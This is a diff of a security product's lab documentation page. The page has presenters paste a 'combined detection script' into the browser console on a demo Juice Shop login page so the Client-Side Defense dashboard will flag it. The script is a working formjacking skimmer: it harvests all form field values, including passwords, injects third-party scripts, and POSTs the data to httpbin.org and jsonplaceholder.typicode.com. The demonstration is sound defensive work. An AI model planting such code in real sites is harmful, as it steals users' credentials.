@@ -1,60 +1,90 @@
 ---
 title: Detection & Mitigation
 sidebar:
-  order: 6
+  order: 7
   label: Detection & Mitigation
 ---
 
 import { Aside, Code, Steps } from "@astrojs/starlight/components";
 
-export const triggerScript = `// CSD Formjacking Simulation — paste into DevTools Console on the login page
+export const combinedScript = `// CSD Demo — Combined Detection Script
+// Triggers ALL CSD detection signals: field reads, script injection, exfiltration
 (function() {
-    console.log('[CSD Demo] Starting formjacking simulation...');
+    console.log('='.repeat(50));
+    console.log('[CSD Demo] Combined Detection Script — Starting');
+    console.log('='.repeat(50));
 
-    // Step 1: Harvest existing form fields (CSD tracks fields present at page load)
-    const inputs = document.querySelectorAll('input');
-    const harvested = {};
+    // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
+    console.log('\\n[Formjack] Phase 1: Form field harvesting');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
     inputs.forEach(function(input) {
-        const name = input.name || input.id || input.type;
+        var name = input.name || input.id || input.type;
         harvested[name] = input.value || '(empty)';
     });
-    console.log('[CSD Demo] Harvested ' + Object.keys(harvested).length + ' form fields:', harvested);
+    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
 
-    // Step 2: Inject a third-party script tag (CSD detects new script domains)
-    var script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
-    script.onload = function() {
-        console.log('[CSD Demo] Third-party script loaded from cdn.jsdelivr.net');
-    };
-    document.head.appendChild(script);
-    console.log('[CSD Demo] Injected third-party script tag (cdn.jsdelivr.net)');
+    // Phase 2: Inject third-party scripts from 3 CDN domains
+    console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.30.1/moment.min.js', name: 'cdnjs' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() {
+            console.log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[Supply Chain] Load attempted from ' + cdn.name);
+        };
+        document.head.appendChild(script);
+        console.log('[Supply Chain] Injected script tag: ' + cdn.name);
+    });
 
-    // Step 3: Exfiltrate harvested data to external domains
-    var payload = JSON.stringify(harvested);
+    // Phase 3: Exfiltrate harvested data to external endpoints
+    console.log('\\n[Exfil] Phase 3: Data exfiltration');
+    var payload = JSON.stringify({
+        type: 'combined_demo',
+        credentials: harvested,
+        page: window.location.href,
+        timestamp: Date.now()
+    });
+
     fetch('https://httpbin.org/post', {
         method: 'POST',
         mode: 'no-cors',
         body: payload
     }).then(function() {
-        console.log('[CSD Demo] Data exfiltrated to httpbin.org');
+        console.log('[Exfil] Data sent to httpbin.org');
     });
+
     fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: payload
     }).then(function() {
-        console.log('[CSD Demo] Data exfiltrated to jsonplaceholder.typicode.com');
+        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
     });
 
-    console.log('[CSD Demo] Simulation complete. Detection takes 5-10 minutes to appear in the CSD console.');
+    // Summary
+    console.log('\\n' + '='.repeat(50));
+    console.log('[CSD Demo] Simulation complete');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (3 CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
+    console.log('='.repeat(50));
 })();`;
 
 ## Trigger Detection
 
-CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, you cannot trigger CSD detection with curl commands — it requires real browser-side script activity. The following script simulates a formjacking attack by harvesting existing form field values, injecting a third-party script, and exfiltrating data to external domains.
+CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, you cannot trigger CSD detection with curl commands — it requires real browser-side script activity. The following combined script triggers all three CSD detection signals in a single execution: form field harvesting, third-party script injection from multiple CDN domains, and data exfiltration to external endpoints.
 
-### Run the Simulation Script
+### Run the Combined Simulation Script
 
 <Steps>
 1. Navigate to the Juice Shop **login page** at `https://botdemo.sales-demo.f5demos.com/#/login`
@@ -67,9 +97,9 @@ CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, 
 
 4. Paste the following script into the console and press **Enter** — it runs automatically as a self-executing function
 
-   <Code code={triggerScript} lang="js" title="Formjacking Simulation" />
+   <Code code={combinedScript} lang="js" title="Combined Detection Script" />
 
-5. Observe the `[CSD Demo]` console output confirming each step: field harvesting, script injection, and data exfiltration
+5. Observe the phased `[CSD Demo]` console output confirming each step: field harvesting, script injection from 3 CDN domains, and data exfiltration
 
    ![Console output after running the simulation script](/csd/images/devtools-console-output.png)
 </Steps>
@@ -80,17 +110,21 @@ Detection takes **5-10 minutes** to appear on the CSD dashboard. If alerts are n
 
 ### What the Script Does
 
-The simulation replicates the three behaviors CSD is designed to detect:
+The combined simulation triggers all three CSD detection signals:
 
 | Behavior | What the Script Does | What CSD Sees |
 | --- | --- | --- |
-| **Field harvesting** | Reads values from existing `input` elements (email, password) | Scripts reading sensitive form fields |
-| **Script injection** | Appends a `<script>` tag loading lodash from `cdn.jsdelivr.net` | New third-party script domain appearing on the page |
-| **Data exfiltration** | Sends harvested data via `fetch` to `httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains |
+| **Field harvesting** | Reads values from existing `input` elements (email, password) | Scripts reading sensitive form fields — flagged High Risk |
+| **Script injection** | Appends 3 `<script>` tags loading from `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, and `unpkg.com` | 3 new third-party script domains on the page |
+| **Data exfiltration** | Sends harvested data via `fetch` to `httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains (note: fetch destinations appear as script network interactions, not in the Network domain view) |
 
 <Aside type="note">
-CSD only tracks form fields that exist in the DOM at **page load**. Dynamically created fields are not monitored. This is why the script reads existing fields rather than injecting new ones.
+CSD only tracks form fields that exist in the DOM at **page load**. Dynamically created fields are not monitored. The Network view shows **script-load source domains** only — fetch/XHR destinations do not appear there. See [CSD Capabilities — Detection Boundaries](/csd/capabilities/#detection-boundaries) for the full list of limitations.
 </Aside>
+
+### Advanced Simulations
+
+For presenters who want to demonstrate specific attack categories individually, the [Attack Script Library](/csd/attack-scripts/) provides 10 targeted scripts organized by attack type: formjacking, digital skimming, supply chain injection, data exfiltration, DOM manipulation, and a maximum stress test.
 
 ## Dashboard
 
@@ -107,6 +141,14 @@ The summary cards show **actioned** script domains:
 - **Transactions Consumed** — CSD telemetry events processed this month (confirms CSD is active)
 
 The domain table lists **third-party script source domains** that have been classified. It does not show the protected application domain itself. Each row shows the domain status, last seen timestamp, domain category, and the locations (URLs) where scripts from that domain were found.
+
+After running the combined simulation, the following domains should appear once they are actioned:
+
+| Domain | Source |
+| --- | --- |
+| `cdn.jsdelivr.net` | Injected script (lodash) |
+| `cdnjs.cloudflare.com` | Injected script (moment.js) |
+| `unpkg.com` | Injected script (underscore) |
 
 <Aside type="note">
 If no third-party scripts have been actioned yet, the domain table may show "No data found." This is expected — new detections appear in the **Script List** first, and only move to the dashboard domain table after being actioned (allowed or mitigated).
@@ -133,10 +175,10 @@ Open the **Script List** from the left navigation to view all detected scripts.
 | **Network Interactions** | Count of network calls made by the script |
 | **Form Fields** | Number of form fields the script reads |
 
-After running the simulation, you should see:
+After running the combined simulation, you should see:
 
 - **Application scripts** (e.g., `main.js`, `vendor.js`) flagged as **High Risk / Action Needed** because they read sensitive form fields (email, password)
-- **The injected third-party script** (`cdn.jsdelivr.net/npm/lodash...`) appearing as a new entry
+- **3 new third-party scripts** from `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, and `unpkg.com` appearing as new entries in the list
 
 <Steps>
 1. Sort by **Risk Level** (High Risk first)
@@ -183,7 +225,13 @@ The **All Domains** tab lists each domain with:
 - **Domain Category** (e.g., Computer and Internet Info)
 - **Added to Allow/Mitigate List** status (Unlisted, Allowed, or Mitigated)
 
-After running the simulation, `cdn.jsdelivr.net` should appear as a new domain entry because the injected `<script>` tag loaded JavaScript from that domain.
+After running the combined simulation, these domains should appear as new entries because the injected `<script>` tags loaded JavaScript from these CDNs:
+
+| Domain | Library Loaded |
+| --- | --- |
+| `cdn.jsdelivr.net` | lodash |
+| `cdnjs.cloudflare.com` | moment.js |
+| `unpkg.com` | underscore |
 
 Use the **Mitigate List** and **Allow List** tabs to review domains that have already been actioned.
 
@@ -229,3 +277,5 @@ From the **Dashboard**, click the **...** actions menu on a flagged domain and s
 </Steps>
 
 Mitigated scripts are blocked from executing on the next page load. Mitigation is reversible — removing the domain from the Mitigate List restores script execution.
+
+For programmatic mitigation via the API, see [API Automation — Mitigation](/csd/automation/#mitigation).
